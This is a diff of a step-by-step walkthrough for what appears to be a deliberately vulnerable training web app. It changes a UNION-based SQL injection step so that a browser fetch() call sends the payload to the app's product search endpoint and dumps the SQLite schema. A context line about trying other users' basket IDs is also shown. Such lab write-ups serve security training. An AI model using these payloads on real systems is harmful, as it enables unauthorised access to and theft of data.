@@ -54,7 +54,8 @@ Try basket IDs `1`, `2`, `3` until you see someone else's basket.
 ### 5. UNION SQL Injection — Extract DB Schema
 In the **search bar** type:
 ```sql
-')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
+fetch("/rest/products/search?q=a')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--")
+.then(r=>r.json()).then(console.log)
 ```
 
 ---
